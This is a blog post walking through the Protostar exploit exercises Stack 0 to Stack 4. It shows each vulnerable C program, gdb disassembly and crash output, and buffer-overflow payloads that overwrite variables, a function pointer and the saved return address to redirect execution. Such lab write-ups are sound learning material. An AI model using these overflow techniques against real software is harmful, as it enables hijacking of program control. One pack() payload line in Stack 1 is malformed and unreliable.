---
layout: post
title: "Hello pwnable, Protostar Stack0~5"
date: 2015-08-11 11:53:34 +0000
comments: true
categories: 
---

On my summer holiday, I have spent a couple of day to learn pwnable at  [protostar](https://exploit-exercises.com/protostar/) where has interesting challenges. With newbie, i believe that if you try to follow from Stack 0 to Stack 5 (i wanna more, but now i haven't finished all of them), you will got steady base about Stack and have plan to dig deeper for the Buffer over Flow technique in the future.

After reading my previous articles, you know my English is too terrible. I will try with my best, and blogging is one of my efforts to improve my English.

Here we go,

## STACK 0
This is the first (easiest, too) level. They've given us a piece of code:

```
/* stack0.c */
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

Our goal is modify `modified`'s value through `gets(buffer)` function. "Sound fabulous, how can i change this variable's value when i cant touch it ?". However, when you use [gdb](http://www.gnu.org/software/gdb/) to debug that file, you will recognize that `buffer`'s address is just below `modified`'s address in STACK. So, if we overload the `buffer`, the leftover will overwrite `modified` => the payload we need in this level is a string contains 70 * `A` (try more if you want).


## STACK 1

In this challenge, we have a code which is much the same as previous one.

```
/* stack1.c */
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

Not only overload `buffer`, we need make `modified`'s value same as `0x61626364` (equal to `dcba` in ascii).
Cuz the execute environment belongs to Little Endiance system, so you must `pack('<I', targetvalue)`

```
payload = 64 * 'A' + pack('<I", '0x61626364')
        = 64 * 'A' + '\x64\x63\x62\x61'
```

## STACK 2

```
/* stack2.c */
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

Instead of reading buffer from keyboard, this level require `GREENIE` environment variable. We use `export` command in Linux

```
➜  GREENIE=`python2 -c 'print "A" * 64 + "\x0a\x0d\x0a\x0d"'`
➜  export GREENIE
➜  ./stack2
you have correctly modified the variable
```

## STACK 3

```
/* stack3.c */
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

In the end of this piece of code, the program call the function which has address stored in `fp` 's value. So, how to force the program to call `win` function ? The first thought is overwrite `win` 's address to `fp` value.

But, what is `win`'s address ?

Using gdb (with [peda](https://github.com/longld/peda)) we have:

```
➜  gdb -q stack3
Reading symbols from stack3...done.
gdb-peda$ disass win
Dump of assembler code for function win:
   0x08048424 <+0>:     push   ebp
   0x08048425 <+1>:     mov    ebp,esp
   0x08048427 <+3>:     sub    esp,0x18
   0x0804842a <+6>:     mov    DWORD PTR [esp],0x8048540
   0x08048431 <+13>:    call   0x8048360 <puts@plt>
   0x08048436 <+18>:    leave
   0x08048437 <+19>:    ret
End of assembler dump.
gdb-peda$
```
So `win` 's address is `0x08048424`. Now, we will build a payload, which contains 64 'A' characters and `0x08048424` in Little Endiance.

```
➜  python2 -c 'print "A" * 64 + "\x24\x84\x04\x08"' > input3.b
➜  ./stack3 < input3.b
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

## STACK 4

```
/* stack4.c */
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

This piece of code is so brief. Same idea as Stack 3, we must change code flow to `win` function, however there is no `fb` for us overwrite.

> It's time for EIP.

When disassembly main function, we have:

```
➜  gdb -q stack4
Reading symbols from stack4...done.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x08048408 <+0>:     push   ebp
   0x08048409 <+1>:     mov    ebp,esp
   0x0804840b <+3>:     and    esp,0xfffffff0
   0x0804840e <+6>:     sub    esp,0x50
   0x08048411 <+9>:     lea    eax,[esp+0x10]
   0x08048415 <+13>:    mov    DWORD PTR [esp],eax
   0x08048418 <+16>:    call   0x804830c <gets@plt>
   0x0804841d <+21>:    leave
   0x0804841e <+22>:    ret
End of assembler dump.
gdb-peda$
```

After `leave` instructor in `*main+21`, the program will call the function which has address equal to `EIP register`'s value. The easiest way to pass this level is overwrite EIP. 

First of all, we need `EIP` 's offset. Try inject `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234567`

```
➜  gdb stack4
Reading symbols from stack4...done.
gdb-peda$ r
Starting program: /root/protostar/bin/stack4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234567

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffda90 ('A' <repeats 74 times>, "1234567")
EBX: 0x0
ECX: 0xf7fca5a0 --> 0xfbad2288
EDX: 0xf7fcb87c --> 0x0
ESI: 0x1
EDI: 0xf7fca000 --> 0x1b5db0
EBP: 0x32314141 ('AA12')
ESP: 0xffffdae0 --> 0x37 ('7')
EIP: 0x36353433 ('3456')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x36353433
[------------------------------------stack-------------------------------------]
0000| 0xffffdae0 --> 0x37 ('7')
0004| 0xffffdae4 --> 0xffffdb74 --> 0xffffdca3 ("/root/protostar/bin/stack4")
0008| 0xffffdae8 --> 0xffffdb7c --> 0xffffdcbe ("USER=root")
0012| 0xffffdaec --> 0x0
0016| 0xffffdaf0 --> 0x0
0020| 0xffffdaf4 --> 0x0
0024| 0xffffdaf8 --> 0xf7fca000 --> 0x1b5db0
0028| 0xffffdafc --> 0x8048218 --> 0x675f5f00 ('')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x36353433 in ?? ()
```

We have '0x36353433' (equal to `3456` in ascii).

```
payload = prefix + target_address
prefix = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12"
```

Next, we will find address of `win` function through the previous way.

```
gdb-peda$ disass win
Dump of assembler code for function win:
   0x080483f4 <+0>:     push   ebp
   0x080483f5 <+1>:     mov    ebp,esp
   0x080483f7 <+3>:     sub    esp,0x18
   0x080483fa <+6>:     mov    DWORD PTR [esp],0x80484e0
   0x08048401 <+13>:    call   0x804832c <puts@plt>
   0x08048406 <+18>:    leave
   0x08048407 <+19>:    ret
End of assembler dump.
```

=> 0x080483f4

```
payload = prefix + target_address
prefix = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12"
target_address = "\xf4\x83\x04\x08"
payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12" + "\xf4\x83\x04\x08"
```

Compose input file and inject to program

```
➜  python2 -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12" + "\xf4\x83\x04\x08"' > input4.b
➜  ./stack4 < input4.b
code flow successfully changed
[1]    50114 segmentation fault (core dumped)  ./stack4 < input4.b
```

